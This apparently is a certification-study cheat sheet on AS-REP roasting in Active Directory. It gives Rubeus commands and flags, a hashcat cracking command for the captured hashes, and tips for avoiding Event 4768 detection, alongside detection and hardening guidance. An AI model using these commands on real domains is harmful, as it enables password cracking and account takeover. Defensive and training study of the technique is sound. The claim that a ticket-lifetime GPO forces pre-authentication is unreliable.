name: Rubeus - AS-REP Roasting (Windows)
description: Requests AS-REP tickets for accounts with Kerberos pre-authentication disabled. /nowrap outputs the full hash on one line for easy copy-paste into Hashcat. /format:hashcat ensures $krb5asrep$ format compatible with mode 18200. Without /user it roasts all vulnerable accounts in the domain.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== RUBEUS vs GETNPUSERS.PY ===
Both attack the same vulnerability — accounts with pre-auth disabled.
  Rubeus (Windows)     → runs on the target Windows host, native Kerberos stack
  GetNPUsers.py (Linux)→ remote attack from attacker machine, no foothold needed
Use Rubeus when you're already on a Windows host and want to stay in-memory.
Use GetNPUsers.py for initial access (no domain credentials possible).

=== FLAGS EXPLAINED ===
  /user:mmorgan   → target specific user (omit for all vulnerable accounts)
  /nowrap         → hash on single line (essential for Hashcat — hash must be one line)
  /format:hashcat → outputs $krb5asrep$23$... format instead of default JtR format
  /domain:        → specify domain if not domain-joined or wrong domain
  /dc:            → target DC IP
  /outfile:       → save hashes to file directly

=== OUTPUT TO LOOK FOR ===
  [*] AS-REP roast hash for user: mmorgan
  $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:A2B1C3...

Prefix $23$ = RC4 (etype 23) → Hashcat mode 18200
Prefix $18$ = AES256 (etype 18) → also mode 18200 but significantly harder to crack

=== CRACK THESE HASHES ===
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

=== OPSEC ===
Kerberos AS-REQ without pre-auth sent to DC generates Event 4768 (Kerberos TGT request).
Requesting for many accounts in rapid succession looks like a scan. Use /user to
target specific accounts from your PowerView enumeration rather than bulk roasting.

=== NO CREDENTIALS REQUIRED ===
If you just need the hash with zero creds:
  .\Rubeus.exe asreproast /format:hashcat /nowrap
This works from any domain-joined machine, even with a low-privilege account.
Anonymous requests may also work from non-joined machines depending on DC config. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).

defense.why_it_works: If an account has 'Do not require Kerberos pre-authentication' set, the KDC returns an AS-REP whose encrypted portion is derived from the user's password hash — to ANY requester, no auth needed. That ciphertext is crackable offline (AS-REP roasting).
defense.impact: Crackable AS-REP hashes for offline cracking.
defense.detection: [MITRE T1558.004] Event 4768 (AS-REQ) with Pre-Authentication Type 0 and RC4 encryption; a request for an account with pre-auth disabled; a honeypot no-preauth account request is malicious.
defense.artifacts: 4768 AS-REQs (pre-auth 0, RC4); the hashes; Rubeus execution.
defense.prevention: Enable Kerberos pre-authentication (disable only when truly required); enforce 25+ character passwords for any account that must have it off; quarterly review of no-preauth accounts; Defender for Identity detects AS-REP roasting.
defense.evasion: Rubeus defaults to RC4; target one account to avoid a 4768 spike.
defense.misconfiguration: The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.
defense.vulnerable_config:
# Active Directory user account attribute (via ADUC or ADSI Edit)
# 'Do not require Kerberos preauthentication' = CHECKED
# In PowerShell:
Set-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true

# UAC flag value: 0x400000 (4194304)
# Confirmed with:
Get-ADUser svc_backup -Properties DoesNotRequirePreAuth
defense.secure_config:
# Enforce Kerberos pre-authentication (the secure default)
# In PowerShell:
Set-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false

# Bulk fix — find and fix all no-preauth accounts:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
  Set-ADAccountControl -DoesNotRequirePreAuth $false

# GPO path (Kerberos policy):
# Computer Configuration > Windows Settings > Security Settings >
# Account Policies > Kerberos Policy
# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)
